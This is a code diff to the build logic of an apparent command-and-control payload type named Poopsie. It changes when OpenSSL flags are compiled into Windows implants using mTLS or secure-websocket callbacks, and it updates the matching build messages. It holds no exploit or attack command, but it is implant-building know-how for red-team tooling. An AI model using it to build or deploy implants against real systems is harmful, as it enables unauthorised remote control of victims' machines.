@@ -829,7 +829,10 @@ class Poopsie(PayloadType):
             needs_openssl_for_exchange = encrypted_exchange in ["T", "TRUE"]
             
             if selected_os == "Windows":
-                needs_openssl_for_transport = (profile == "mtls")
+                needs_openssl_for_transport = (
+                    profile == "mtls" or
+                    (profile == "websocket" and callback_host.startswith("wss://"))
+                )
             else:
                 needs_openssl_for_transport = (
                     callback_host.startswith("https://") or 
@@ -874,7 +877,17 @@ class Poopsie(PayloadType):
 
             if use_openssl:
                 if selected_os == "Windows":
-                    build_messages.append("Static OpenSSL enabled (RSA key exchange + HTTPS/WSS transport, no DLL dependencies)")
+                    if needs_openssl_for_transport:
+                        # mTLS and ws library (wss://) use Nim's SSL module, which requires -d:ssl
+                        # and OpenSSL DLLs on the target (libssl-3-x64.dll, libcrypto-3-x64.dll)
+                        nim_args.append("-d:ssl")
+                        if profile == "mtls":
+                            build_messages.append("OpenSSL enabled for mTLS transport (-d:ssl, requires OpenSSL DLLs on target)")
+                        else:
+                            build_messages.append("OpenSSL enabled for WSS transport (-d:ssl, requires OpenSSL DLLs on target)")
+                    if needs_openssl_for_exchange:
+                        # RSA key exchange on Windows uses BCrypt (native), no OpenSSL needed
+                        build_messages.append("RSA key exchange enabled (native Windows BCrypt API)")
                 elif selected_os == "Linux":
                     nim_args.extend([
                         "-d:ssl",
@@ -893,8 +906,8 @@ class Poopsie(PayloadType):
                     build_messages.append("AESPSK mode (no RSA, standard httpclient)")
             
             if selected_os == "Windows":
-                if callback_host.startswith("https://") or callback_host.startswith("wss://"):
-                    build_messages.append("Custom WinHTTP client (native Windows API for HTTPS/WSS transport, no DLLs)")
+                if callback_host.startswith("https://"):
+                    build_messages.append("Custom WinHTTP client (native Windows API for HTTPS transport, no DLLs)")
             
             if output_type == "DLL":
                 nim_args.extend([
